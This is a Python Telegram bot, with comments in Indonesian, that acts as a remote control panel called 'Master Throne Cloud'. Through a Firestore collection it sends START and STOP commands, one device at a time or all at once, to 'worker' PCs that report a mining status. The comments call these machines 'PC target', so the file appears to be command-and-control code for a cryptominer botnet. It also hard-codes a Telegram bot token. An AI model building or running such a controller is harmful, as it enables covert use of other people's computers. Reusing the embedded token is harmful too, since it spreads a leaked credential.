import telebot
from telebot import types
import firebase_admin
from firebase_admin import credentials, firestore
import time
import json
import os

# --- KONFIGURASI TELEGRAM ---
# Pastikan TOKEN ini benar tanpa spasi tambahan
TOKEN = '8710550128:AAFmR0WHZplvyJquXAfrcIiTHcOkzxSNvnA'
MY_ID = 5828061077
bot = telebot.TeleBot(TOKEN.replace(" ", "")) # Membersihkan spasi jika ada

# --- KONFIGURASI FIRESTORE (CLOUD) ---
APP_ID = "euforia-9b0bf"

# Inisialisasi Firebase yang lebih aman
db = None
if not firebase_admin._apps:
    try:
        if os.path.exists("cloud_config.json"):
            cred = credentials.Certificate("cloud_config.json")
            firebase_admin.initialize_app(cred)
            db = firestore.client()
        else:
            print("Error: File cloud_config.json tidak ditemukan!")
    except Exception as e:
        print(f"Gagal inisialisasi Firebase: {e}")
else:
    db = firestore.client()

# Path: /artifacts/euforia-9b0bf/public/data/workers
if db:
    coll_ref = db.collection('artifacts', APP_ID, 'public', 'data', 'workers')
else:
    print("CRITICAL: Database tidak terhubung!")

def set_command(node_id, cmd):
    try:
        doc_ref = coll_ref.document(node_id)
        doc_ref.update({'command': cmd, 'timestamp': time.time()})
        return True
    except: return False

def set_global_command(cmd):
    try:
        docs = coll_ref.get()
        for doc in docs:
            doc.reference.update({'command': cmd, 'timestamp': time.time()})
    except: pass

@bot.message_handler(commands=['start', 'menu'])
def menu(message):
    if message.from_user.id == MY_ID:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔍 Cek & Kontrol Per PC", callback_data="status_all"))
        markup.add(types.InlineKeyboardButton("🚀 Start Semua", callback_data="all_start"),
                   types.InlineKeyboardButton("🛑 Stop Semua", callback_data="all_stop"))
        bot.reply_to(message, "👑 **Master Throne Cloud v2.1**\nProject: euforia-9b0bf", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.from_user.id != MY_ID: return

    if call.data == "status_all":
        try:
            docs = coll_ref.get()
            if not docs:
                bot.send_message(call.message.chat.id, "Belum ada laporan dari PC target.")
                return

            for doc in docs:
                data = doc.to_dict()
                node_id = doc.id

                # FIX ERROR: Konversi last_seen ke float untuk menghindari TypeError
                try:
                    last_seen_raw = data.get('last_seen', 0)
                    last_seen = float(last_seen_raw)
                except (ValueError, TypeError):
                    last_seen = 0

                now = time.time()
                status_icon = "✅" if (now - last_seen) < 300 else "❌"
                mining_status = data.get('mining_status', 'Unknown')

                row = types.InlineKeyboardMarkup()
                row.add(types.InlineKeyboardButton(f"🚀 Start", callback_data=f"single_start_{node_id}"),
                        types.InlineKeyboardButton(f"🛑 Stop", callback_data=f"single_stop_{node_id}"))

                bot.send_message(call.message.chat.id,
                                 f"{status_icon} **Device: {node_id}**\nStatus: `{mining_status}`",
                                 reply_markup=row, parse_mode="Markdown")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"⚠️ Gagal mengambil data: {e}")

    elif call.data == "all_start":
        set_global_command("START")
        bot.send_message(call.message.chat.id, "Sinyal START massal dikirim.")
    elif call.data == "all_stop":
        set_global_command("STOP")
        bot.send_message(call.message.chat.id, "Sinyal STOP massal dikirim.")
    elif call.data.startswith("single_"):
        p = call.data.split("_")
        if set_command(p[2], p[1].upper()):
            bot.send_message(call.message.chat.id, f"🎯 {p[1].upper()} dikirim ke {p[2]}")

if __name__ == "__main__":
    print("--- Throne Master Online ---")
    bot.polling(none_stop=True)
